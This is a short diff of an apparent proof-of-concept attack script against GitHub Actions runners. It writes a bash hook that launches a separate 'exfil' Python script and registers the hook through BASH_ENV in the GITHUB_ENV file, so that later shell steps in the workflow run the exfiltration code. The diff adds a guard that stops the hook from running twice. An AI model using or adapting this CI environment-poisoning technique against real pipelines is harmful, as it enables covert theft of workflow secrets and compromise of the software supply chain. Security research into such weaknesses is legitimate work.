@@ -29,7 +29,7 @@ for t in targets:
 try:
     hook = os.path.join(ws, "poc_hook.sh")
     with open(hook, "w") as f:
-        f.write("#!/bin/bash\npython3 %s || true\n" % exfil)
+        f.write("#!/bin/bash\nunset BASH_ENV\n[ -n \"${POC_HOOK_RAN:-}\" ] && return 0 2>/dev/null\nexport POC_HOOK_RAN=1\npython3 %s || true\n" % exfil)
     with open(os.environ["GITHUB_ENV"], "a") as f:
         f.write("BASH_ENV=%s\n" % hook)
     out("bash_env_hook=set")
